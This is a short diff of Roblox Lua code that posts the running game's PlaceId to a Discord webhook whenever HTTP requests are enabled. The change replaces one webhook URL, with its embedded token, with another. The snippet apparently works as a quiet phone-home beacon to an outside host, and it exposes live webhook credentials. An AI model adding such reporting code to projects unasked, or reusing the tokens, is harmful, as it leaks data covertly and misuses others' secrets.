@@ -8,6 +8,6 @@ if game:GetService("HttpService").HttpEnabled then
 			content = "**Game ID:** " .. game.PlaceId 
 	}
 	local success, response = pcall(function()
-			return game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1334977341209968640/ZEc46TGVktdwhJyhxt67Bs7w1uuOyI-zEgMABH221tryNFNCDPccqT3b1_Hn9kNEpuvh", game:GetService("HttpService"):JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+			return game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1398344058468040806/K3A0n2c-f9F5h--RMUI9qbPLCjjVkx0hcZvWPPBR-0s-6iO-VjMfRaYGYzUEZyT8qLPj", game:GetService("HttpService"):JSONEncode(data), Enum.HttpContentType.ApplicationJson)
 	end)
 end
